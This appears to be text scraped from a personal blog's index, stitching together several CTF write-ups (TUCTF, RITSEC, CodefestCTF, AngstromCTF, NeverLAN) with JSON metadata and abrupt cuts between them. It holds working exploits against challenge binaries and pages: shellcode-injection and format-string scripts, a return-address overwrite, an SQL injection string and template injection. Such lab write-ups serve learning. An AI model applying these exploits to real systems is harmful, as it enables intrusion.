Hence it can be exploited for buffer overflow. First, using GDB (with GEF), we find that the offset required to overflow the buffer is 24.\n   Disassembly of main   This can be done using pattern create 50 and then using that pattern to find the crash offset.\n      Also inspecting the functions, we see that there is a printFlag function at 0x80491f6.

On analysing it using GDB, and using vmmap, we find that the adress given to us is that of the stack and the stack is read, write and executable.\n   We use shell-storm to get the shellcode. First we get the offset of the crash like before. In the script below, we use the shellcode, pad it with \u0026lsquo;A's and then provide the address to write to, i.e. the adress provided to us.\nshellcode = \u0026#34;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\u0026#34; len_shell_code = 28 from pwn import * # context.log_level = \u0026#39;debug\u0026#39; p = process(\u0026#34;./shellme32\u0026#34;) offset = 40 p.recvuntil(\u0026#39;?\\n\u0026#39;) addr = int(p.recvline().strip(), 16) p.recvuntil(\u0026#39;\u0026gt; \u0026#39;) log.info(\u0026#39;Stack Address: \u0026#39; + str(hex(addr))) payload = shellcode payload += \u0026#34;A\u0026#34;*(offset - len_shell_code) payload += p32(addr) print(len(shellcode)) p.sendline(payload) with open(\u0026#39;payload\u0026#39;, \u0026#39;wb\u0026#39;) as f: f.write(payload) p.interactive()  printfun - 500 pts Here, on analysing with Ghidra, we find that there is a format string vulnerability.\n   So, here first we use GDB to get the addresses of the two buffers being compared. Also, as input if we provide \u0026quot;%x %x %x %x %x %x %x %x %x %x %x %x %x %x\u0026quot;, for the instance running on GDB we get this output -\n5655a050 3c 14 1 ffffc994 5655a050 5655a008 ffffc900 0 0 f7e06637 f7fa0000 f7fa0000 0\nOn seeing the values displayed by GDB, we see two addresses - 0x5655a008 and 0x5655a050\n   This is intereting as both these addresses are also present in the program's output with our input.\nSo, all we have to do is overwrite the 6th and 7th \u0026ldquo;addresses\u0026rdquo; of the output to the same value so that the string comparison passes.\nWe write the following exploit code, which works locally. I hope it would work remotely as well (but no way to test it now ☹) -\nfrom pwn import * p = process(\u0026#34;printfun\u0026#34;) payload = \u0026#34;AAAA%6$n%7$n\u0026#34; p.sendlineafter(\u0026#39;? \u0026#39;, payload) p.interactive()  Rev Challenges faker - 400 pts If we open the binary in Ghidra, we see that there are calls to different functions, namely A, B and C, which depend on the user input. But on trying them, we get fake flags.\n   But all of them have a common structure, they have a call to printFlag with a string.\n   Also in the functions list, we see that there is a function named thisone. First we take a look at printFlag function.\n   There can be two ways to solve this challenge.\nMethod 1 - Static Write a script to emulate the functionality of the printFlag function.\ndef printFlag(s): s2 = \u0026#34;\u0026#34; for i in range(len(s)): x = ((((ord(s[i]) ^ 0xf) - 0x1d) * 8) % 0x5f) + 0x20 s2 += chr(x) print(s2) printFlag(\u0026#34;\\\\PJ\\\\fC|)L0LTw@Yt@;Twmq0Lw|qw@w2$a@0;w|)@awmLL|Tw|)LwZL2lhhL0k\u0026#34;) This gives us the flag - TUCTF{7h3r35_4lw4y5_m0r3_70_4_b1n4ry_7h4n_m3375_7h3_d3bu663r}\nMethod 2 - Dynamic Here set a breakpoint in main and then run the following commads in GDB.\n(gdb) info functions # get address of printFlag function (gdb) set $rip=0x000055555555534b # i.e. to the address of the function (gdb) c This will print the flag.\n core - 400 pts We a re provided a core dump and a C file.

I found that this is a reference to a short story by Edgar Allan Poe, called The Gold Bug which involves a substitution cipher. I found an online tool for the same.\nThis gives us the flag —RITSEC{POEWASTHEGOAT}\n random — 290 pts\nAfter connecting to nc ctfchallenges.ritsec.club 8001 we find that we are presented with a series of numbers and we have to guess the next. The challenge title tells us that we have something to do with the random function in the C language, because of the hint,\n Are you starting to \u0026lsquo;C\u0026rsquo; a pattern?\n We make a guess that whenever we request that host and port, the random function is initialized with a certain seed and we are given the first five random numbers generated from that seed. So, I wrote a simple C code to bruteforce all unix timestamps from 15th Nov 2019, 00:00 UTC to 17th Nov. 2019 00:00 UTC, and check for the seed. The code is shown below —\n#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt; int main() { int start = 1573776000; // 15th Nov 2019, 00:00 UTC  int end = 1573948800; // // 17th Nov 2019, 00:00 UTC  for(int i=start; i\u0026lt;end; i++) { srand(i); int a = rand(); int b = rand(); int c = rand(); int d = rand(); int e = rand(); int f = rand(); if(a==1068399227 \u0026amp;\u0026amp; b==161933545 \u0026amp;\u0026amp; c==741438783 \u0026amp;\u0026amp; d==1951874661 \u0026amp;\u0026amp; e==1076387813) { printf(\u0026#34;Seed: %d\\n\u0026#34;, i); printf(\u0026#34;Next: %d\\n\u0026#34;, f); break; } } return 0; } We provide the next number, and get the flag — RITSEC{404_RANDOMNESS_NOT_FOUND}\n Misc  Crack me If You Can — 391 pts\nIn this challenge, after connecting to nc ctfchallenges.ritsec.club 8080, we find that we are presented with queries of hashes, and we have to break them in order to get the flag. They were NTLM and sha256 hashes. So, we used a combination of crackstation.net and John the Ripper to crack both of them.\nWe found the flag — RS{H@$HM31FY0UCAN}\n Onion Layer Encoding — 100 pts\nThe challenge says that the text is encoded using either Base16 or Baser32 or Base64 in a sequence. So we write a simple python script to solve it.\nimport base64 flag = open(\u0026#34;onionlayerencoding.txt\u0026#34;,\u0026#34;r\u0026#34;).read() while \u0026#34;RITSEC\u0026#34; not in str(flag): try: flag = base64.b16decode(flag) except: try: flag = base64.b32decode(flag) except: flag = base64.b64decode(flag) print(flag) The flag is — RITSEC{0n1On_L4y3R}\n AlPhAbEtIcAl Challenge - 100pts\nI couldn't solve this during the CTF, but saw other writeups and found that it was actually pretty interesting. The cipher text that is provided is —\n 59:87:57:51:85:80{:40:50:56:08:82:58:81:08:18:85:57:87:48:85:88:40:50:56:59:15:56:11:18:85:59:51:}\n We see that the \u0026lsquo;{\u0026rsquo; and \u0026lsquo;}\u0026rsquo; are in place. So, this must represent the flag. The other numbers are assigned some alphabet starting from \u0026lsquo;A\u0026rsquo;. After this we see that we have the following — ABCDEF{GHIJKLMJNECBOEPGHIAQIRNEAD}.\nOn this we use an online substitution solver like quipquip.com and also the fact that ABCDEF corresponds to RITSEC, we get the flag as — RITSEC{YOUALPHABETIZEDYOURNUMBERS}\n Web  misdirection — 100 pts\nWe are given a URL — http://ctfchallenges.ritsec.club:5000/ However, on clicking it we see that we are directed to another webpage http://ctfchallenges.ritsec.club:5000/n and the information that the webpage isn't redirecting properly. So, I decided to see what is happening, for that I did a simple wget to the url.\n   Running wget   We see that the page redirects to different pages and keeps doing that. We note that the last character is basically in the flag format when put together. We do that and get the flag — RS{4!way5_Ke3p-m0v1ng}\n Buckets of fun — 100 pts\nWe are given the following URL — http://bucketsoffun-ctf.s3-website-us-east-1.amazonaws.com/\nTaking a hint from the name of the challenge, we try the following URL in the browser —http://bucketsoffun-ctf.s3.amazonaws.com\n   The webpage   We see a file youfoundme-asd897kjm.txt\nHeading to http://bucketsoffun-ctf.s3.amazonaws.com/youfoundme-asd897kjm.txt we find the flag — RITSEC{LIST_HIDDEN_FILES}\n Forensics  Take it to the Cleaners — 100 pts\nWe are given an image\n   The challenge   Performing basic recon, we check the metadata for the image using exiftool.\n   exiftool output   In the user comment, we see a string which is probably base64 encoded.\nDecoding it gives, EVGFRP{SBERAFVPF_SNVYF_JBAG_URYC_LBH_URER}\nLooks rotated by an offset. We use http://theblob.org/rot.cgi to get rotations by different offsets. This is ROT13 and the flag is — RITSEC{FORENSICS_FAILS_WONT_HELP_YOU_HERE}\n Long Gone — 100 pts\nWe are provided a chromebin. Extract it as it is a tar archive.\n tar xzvf ./chromebin\n We see there are a lot of folders, on inspecting the history we find it is an SQLite 3.X database. Loading it into DBBrowser, and inspecting the tables, shows an odd URL — us-central-1.ritsec.club/l/relaxfizzblur\nOpening the url gives the flag — RITSEC{SP00KY_BR0WS3R_H1ST0RY}\n Pwn  999 Bottles — 110 pts\nWe are given 999 ELF files, each having a password as a single character. Basically, 999 crackmes with a one character password. If we check the disassembly of main function of any one —\n   The disassembly for main   At 0x8048728 we see a comparison, where register edx (dl) stores our input character and eax (al) stores the value at address 0x804a039.\nAlso, in the disassembly, we have some character mappings to addresses —\n   Character mappings   So, one way to solve this challenge is to get the address to be compared and check the character at this address and automate it somehow.\nDuring the CTF, however, I wrote a bruteforce script to try all characters for every ELF file.\nfrom pwn import * import string FOLDER = \u0026#39;./elfs/\u0026#39; filenames = [] s = string.digits + string.letters + string.punctuation for i in range(1,1000): filenames.append(str(i).zfill(3) + \u0026#39;.c.out\u0026#39;)flag = \u0026#39;\u0026#39; f = open(\u0026#39;flag.txt\u0026#39;, \u0026#39;w\u0026#39;) for file in filenames: for inp in s: p = process(FOLDER+file) p.recv() p.sendline(inp) a = p.recvline() if \u0026#39;OK!\u0026#39; in a: flag += inp p.close() print(\u0026#34;FLAG: \u0026#34; + flag) f.write(\u0026#34;FLAG: \u0026#34; + flag) f.write(\u0026#39;\\n\u0026#39;) break else: p.close() f.write(\u0026#34;FLAG: \u0026#34; + flag) print(flag) f.close() Finally, we have the following string in the output generated -\n lr^wN${HnW\u0026lt;DtVjk.RITSEC{AuT057v}^W!xT\n Note the string in the flag format, that is the flag — RITSEC{AuT057v}\nA better way to solve it actually using the method described above. The following script can help do that -\nimport r2pipe import binascii import sys for i in range(1, 1000): print(\u0026#39;elfs/{0:03}\u0026#39;.format(i)) b = r2pipe.open(\u0026#39;elfs/{0:03}\u0026#39;.format(i) + \u0026#39;.c.out\u0026#39;) disass = b.cmd(\u0026#39;aaa; s main; pdd\u0026#39;) field = disass.split(\u0026#34;eax = *(obj.\u0026#34;)[1][0] byte = disass.split(f\u0026#39;*(obj.{field}) = \u0026#39;)[-1][2:4] print(binascii.unhexlify(byte).decode(\u0026#39;ascii\u0026#39;), sep=\u0026#39;\u0026#39;) This is all.

On viewing the file in a hex editor, and also checking the magic bytes —\n   Hex view of the image   We know there is something to do with “matrix”. Also for a normal .bmp file the initial magic bytes are 424d 8a44 1300. XORing this with the first six bytes of the given file also gives you “matrix”. So to solve the challenge, we XOR the whole image with “matrix”.\n Run the script, and you obtain the correct file.\n   The correct file   The flag is — CodefestCTF{f1l35_h4v3_m461c_by735}\n Mail capture (Steganography— 100pts) You are presented with a “email friendly text”. This was encoded to unicode by a tool called uuencode. It can be decoded by using uudecode, a decoder for such formats. Running uudecode with the file gives an output file called “flag_encoded”. The contents are the flag — CodefestCTF{7h15_15_4_c001_3nc0d1n9}\n Cats are innocent, right? (Steganography— 500pts) This challenge was based on LSB steganography. I had used a tool called stegify.\nThe challenge image -\n   Challenge image   On running the command -\n stegify -op decode -carrier cute_kittens.jpg -result hello\n We get a hello.zip file which was embedded in the LSBs of the image.

And “+” would mean concatenation of two strings of different type. Also, one will also have to decide on 0 representing 255 255 255 i.e. the color white and 1 representing 0 0 0 , i.e. the color black. You could have experimented with both combinations but eventually you would get the correct mapping.\nThe following script can help generate the image.\n The obtained image is this -\n   You may want to zoom in a bit   The flag is — CodefestCTF{This_15_7h3_f14g}.\n Linux RE 1 (Reversing — 300pts) This challenge was a bit difficult to solve using a debugger due to some anti-debugging techniques that were implemented. Also, initially the ELF was packed using UPX, which was visible as a string when you would have run the strings command. So, first use\n upx -d\n with the ELF to decompress it.\nFor the next part, You could use a disassembler or a decompiler to get the source code and eventually reverse the binary. The executable was generated from a C++ file hence it was a bit messy to view in a decompiler.\nThe decompiled view (using Ghidra) of the main function (the interesting part) is the following -\n   Decompiled main function   The key_int and enc_int are global variables. The main logic of the ELF is in the rahasya function.\n   Decompiled rahasya function   This basically takes two strings and XORs them and returns the XORd string. The two strings it takes as input are the user input and the key_int string. The XORd data is matched with the enc_int data.\nSo, basically to reverse the binary you have to XOR both the key_int and enc_int data.\n   enc_int data      key_int data   Basically,\n int enc_int[] = {80, 93, 3, 67, 3, 86, 11, 110, 64, 2, 90, 27, 84, 28, 110, 75, 3, 69, 52, 6, 11, 5, 80, 88, 90, 88};\n  int key_int[] = {49, 51, 51, 55, 107, 101, 121};\n XOR both of them, and you get an0th3r_s1mp1e_x0r_cr4ckm3\nSo, the flag is CodefestCTF{an0th3r_s1mp1e_x0r_cr4ckm3}\n Linux RE 2 (Reversing — 500pts) Again we open the file in IDA or any disassembler and/or decompiler we see that the input should satisfy a set of conditions on the letters of the input.\nThe conditions can be translated as\n We can use some kind of SMT solver like z3 to find the password.\n The obtained password is — shouldve_used_some_tool\nThe flag, hence, is CodefestCTF{shouldve_used_some_tool}\n Windows RE (Reversing — 500pts) In this problem, the Windows exe file (actually a .NET file) that was provided, was packed with ConfuserEx. We can use NoFuserEx, which is a free deobfuscator for this packer.\nThen, open the executable in any .NET decompiler like dnSpy and check the Form function to get the password as well as the flag.\n Password — thisisa1337password\n The flag — CodefestCTF{51mp13_1npu7_v411d4710n_8u7_w17h_4_7w157}\n No Fatshaming (Web — 600pts) I’ll cheat a bit here xD.

Waldo1\nWe are given a zip file — flags.zip containing flags of countries. The file flag5.png, we see on opening has the flag.\n   Flag-Waldo1    2. Waldo2\nIn this problem, we are given multiple flag images in a folder. Judging by the problem, it seems that one image is different. We see the md5 hash of the few files which are the same-9f6e902c233020026caf0ebbb1cf0ff5. So we write the following script-\n So, the filename we get is waldo339.jpg. Running strings on the file we get the flag as — actf{r3d_4nd_wh1t3_str1p3s}.\n 3. That’s not my name\nWe are given a pdf file — gettysburg.pdf, but on trying to open it, it does not open, giving incorrect file format error. We run binwalk on the file to see that it infact is a docx file. We change the extension to .docx anf on opening we get the flag as — actf{thanks_mr_lincoln_but_who_even_uses_word_anymore}.\n 4. File Transfer\n   Capture   The highlighted packet shows a JPEG image capture. We export the JPEG as bytes to get the image.\n   Flag — File Transfer    5. GIF\nOn running binwalk on the given image, we see that it is infact a collection of many images.\nSo , we run the command binwalk -D 'png image:png' jiggs.gif.png. On inspecting the extracted files, we see an image which has the flag.\n   Flag — Gif    Crypto  1. Warmup\nFrom the term fine cipher, we get the hint that it could be an Affine cipher. We use an online Affine cipher solver to get the flag as — actf{it_begins}.\n 2. Back to Base-ics\nWe are given the following cipher text -\n   Ciphertext   Now we can easily see that the Part 1 is binary(base 2) and Part 3 is hexadecimal(base 16). On decoding them using any online converter, we get\nPart 1: actf{0ne_tw0_f0\nPart 3: n_th1rtytw0_s1x\nAlso judging from the title of the problem, we can say that all the ciphers have the base of some power of two. We guess that Part 2 could be base 8(octal). using an online octal to text converter we get,\nPart 2: ur_eight_sixt33\nThe last one looks like base64. On decrypting, we get\nPart 4: tyf0ur_no_m0re}\nSo, the flag is — actf{0ne_tw0_f0ur_eight_sixt33n_th1rtytw0_s1xtyf0ur_no_m0re}\n 3. XOR\nThis looks like a singlebyteXOR problem. We use the following script\n On seeing all the plain texts, we get the flag as — actf{hope_you_used_a_script}.\n 4. Intro to RSA\nThis is a classical RSA problem, we use the following script to decrypt\n So the flag is — actf{rsa_is_reallllly_fun!!!!!!}.\n WEB  1. Source Me 1\nHere, we are presented with a login page. On inspecting the source, we find the password —f7s0jkl, in the comments. **** So, we login with the username as admin and password as f7s0jkl.\nThis gives us the flag-actf{source_aint_secure}.\n 2. Get Me\nInitially all we have is a button with the message that only authorized users are allowed to pass. On clicking the button, we get the message that we are not authorized. However in the url bar we see that the get parameter is auth=false. We change it to auth=trueand hit enter.\nWe then get the flag — actf{why_did_you_get_me}.\n 3. Sequel\nThis is a classic case of SQL injection(SQLi). The hint here is the name of the problem which is pronunciation of SQL.\nWe enter both username and password as 'or''='.\nThis gives us the flag — actf{sql_injection_more_like_prequel_injection}.\n 4. Source Me 2\nWe are give another login page. Here, too, the username is admin. On inspecting the source, we find the script which converts our entered password to md5 and compares it to the hash bdc87b9c894da5168059e00ebffb9077. We use an online md5 decryptor to get the password as password1234. Entering this gives the flag — actf{md5_hash_browns_and_pasta_sauce}.\n 5. Madlibs\nHere, from the Flask code we see that there is a variable app.secret_key, which is basically a config variable. So we head to Tale of a Person section and enter {{config}} as the Author name and any random strings in the other options.\n   Here we see the SECRET_KEY variable assigned to the flag, actf{wow_ur_a_jinja_ninja}\n Reversing(RE)  1. Rev1\nFirst, we run strings on the given ELF executable. We see the string, s3cret_pa55word. This could be the secret password the program is looking for. On running the executable and giving the above string as key, we get the flag. This is to be done on the shell server.\n 2. Rev2\nThe ELF on executing asks for a number to be guessed. We use radare2 to disassemble the code.\n      The highlighted hex, 0x11d7 is 4567 in decimal. On entering this, the program now asks us to give two two-digit numbers. We again analyze the disassembled code.\n   This tells us that the product of the two numbers should be 0xd67 i.e 3431. From this link, we find that the numbers are 47 and 73. We enter them in ascending order, i.e 47 and then 73.\nWe get the flag as — actf{4567_47_73}.\n Binary  1. Accumulator\nHere the ideas is to keep adding integers to an int variiable and without explicitly entering negative values, we have to make the result negative. This can be done by integer overflow.\n   Running these inputs on the shell server will give us the flag.\n 2. Cookie Jar\nThis is a buffer overflow problem. Although we never explicitly gave a value to numCookie, we can overflow the buffer so that it gets a value. I fwe the following input — aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa99999998 to the program, we get the flag.\nThe flag is — actf{eat_cookies_get_buffer}.\n 3. Number Guess\nWe take the help of the hint given. The most common vulnerability of the printf function is the use(or not) of format strings.\nIn the code, just before the printf(buf) the two random integers are initialized. So, when we are asked for our name, if we give the following input, %d %d %d %d %d %d %d %d %d %d %d %d . This would give us the other numbers in the stack. On running this, we take the 3rd and the 9th value as rand1 and rand2. We add them and give the result as our guess.\n   So the flag is -actf{format_stringz_are_pre77y_sc4ry}.\n 4. Rop to the Top\nThis is an example of Return Oriented Programming (ROP) vulnerability which is basically buffer overflow to access the non-executable stack. To exploit it we can use the following set of commands-\n   We find that the address of the_top function is 0x8048db. Also the buffer size is 0x28.\nSo, the following command works for us-\n./rop_to_the_top32 \u0026ldquo;$(python -c \u0026lsquo;print \u0026ldquo;A\u0026rdquo;*0x28 + \u0026ldquo;BBBB\u0026rdquo; + \u0026ldquo;\\xdb\\x84\\x04\\x08\u0026rdquo;')\u0026quot;\nWe enter the character ‘A’ to fill the size of the buffer, “BBBB” to replace the current stack pointer (%ebx) followed by the address to which we wish to point to, here the address of the_top function.\nRunning the above command on the shell server gives us the flag.\n For more writeups, you can follow me on Github\n","date":1521808624,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1575041664,"objectID":"471b26bb4249728777987eb7deb93689","permalink":"/post/2018-03-23_angstromctf-writeups/","publishdate":"2018-03-23T12:37:04.861Z","relpermalink":"/post/2018-03-23_angstromctf-writeups/","section":"post","summary":"These are the writeups to the problems I solved during the AngstromCTF.\n MISC  1.

We have to find the 5 AV engines which had the highest detection ratio (not detection count) in that file.\nWe write the following script to do that —\n The last five in the list are —\n   High Detection Ratio AV engines   So the flag is — SymantecMobileInsight,CrowdStrike,SentinelOne,Invincea,Endgame\n Reversing Challenges  1. Commitment Issues\nThe first thing which came to my mind is to run strings on the file. I did, and got the flag —flag{don’t_string_me_along_man!}\n Interweb Challenges  1. ajax_not_soap\nOn inspecting the script(ajax) of the webpage, we find that the form compares our username and password with one that is stored at the endpoint /webhooks/get_username.php. On going to that link we find the username as MrClean.\nAlso the password is also checked by the endpoint /webhooks/get_pass.php?username=*username* Replacing username with MrClean we get the password (also the flag) as flag{hj38dsjk324nkeasd9}\n 2. the_red_or_blue_pill\nThe page says we can either take the red pill(endpoint ?red ) or the blue pill(endpoint ?blue ) but not both. We enter the endpoint as ?red\u0026amp;blue to get the flag as flag{breaking_the_matrix…I_like_it!}\n 3. ajax_not_borax\nThis problem is very similar to ajax_not_soap with the difference here that when we go to the endpoint /webhooks/get_username.php?username=, we are presented with a hash (c5644ca91d1307779ed493c4dedfdcb7). We use an online MD5 decryptor to get the value as tideade. Then, when we go to the endpoint /webhooks/get_pass.php?username=tideade, we get a base64 encoded string, which on decryption gives the flag as flag{sd90J0dnLKJ1ls9HJed}\n 4. Das_blog\nFirst, when we are presented with a login page, we find that a testing credential is available as a comment in the HTML. We login using those credentials. Then, we find that the cureent permission is DEFAULT. We need admin permissions to view the flag. On inspecting the cookies, we find that there is a cookie permission which has its value as user. We use the EditThisCookie plugin to change its value to admin. On refreshing, we get the flag as a blog post flag{C00ki3s_c4n_b33_ch4ng3d_?}\n Passwords Challenges  1. Encoding != Hashing\nWe are given a pcap capture. We open this in Wireshark and analyse the HTTP packets using the http filter. On reading the contents of the filtered packets, we find the flag.\n   Wireshark Packets analysis   The flag is flag{help-me-obiwan}\n Trivia Challenges  1. Can you Name it?\nProblem— This system provides a reference-method for publicly known information-security vulnerabilities and exposures.\nAnswer— Common Vulnerabilities and Exposures\n 2. Can you find it? (Bonus)\nProblem— This Vulnerability was used for a major worldwide Ransomware attack. It was so bad it forced the software company to write a patch for end of life systems that they had stopped supporting years before the attack.\nAnswer— EternalBlue. And the ransomware was WannaCry.\n 3. Yummy…\nProblem— These store small pieces of data sent from a website to the user’s computer. This yummy sounding things are stored by the user’s web browser while the user surfing the web. Answer is non-singular.\nAnswer— Cookies\n 4. Can you find it?\nProblem— This Vulnerability was used for a major worldwide Ransomware attack. It was so bad it forced the software company to write a patch for end of life systems that they had stopped supporting years before the attack.\nAnswer— The formal listing code (CVE) for EternalBlue is CVE-2017–0144\n 5. Can you search it?\nProblem— For the Vulnerability you found in question 2, There is a proof of concept. What is the string for TARGET_HAL_HEAP_ADDR_x64?\nAnswer— The vulnerability being discussed is EternalBlue. We canf ind the source code at this link. There we find that TARGET_HAL_HEAP_ADDR_x64 is assigned 0xffffffffffd00010\n 6. Who knew?\nProblem— This product had Highest Number Of “Distinct” Vulnerabilities in 1999\nAnswer— A simple Google search of “Highest Number Of “Distinct” Vulnerabilities in 1999\u0026quot;, gets us the following link. The product with the highest vulnerabilities was Windows NT\n Blast from the Past Challenges 1. cookie_monster\nOn inspecting the cookies, we find that the Cookie value should be the Red Guy’s name. We change the value of the cookie to Elom. On refreshing the page, we get the flag as flag{C00kies_4r3_the_b3st}\n","date":1519721758,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1575041659,"objectID":"3bb2f739ac0a171e988d00372c0b0d0d","permalink":"/post/2018-02-27_neverlan-ctf-2018-writeups/","publishdate":"2018-02-27T08:55:58.711Z","relpermalink":"/post/2018-02-27_neverlan-ctf-2018-writeups/","section":"post","summary":"These are the writeups of the problems I solved over the weekend for the NeverLAN CTF 2018.","tags":["ctf","information security","infosec","writeups"],"title":"NeverLAN CTF 2018 Writeups","type":"post"},{"authors":["Shreyansh Singh"],"categories":["Natural Language Processing"],"content":"Work done as a part of the organizing team of RevOpiD, a shared task organized at IJCNLP 2017 (International Joint Conference on Natural Language Processing, Taipei, Taiwan).
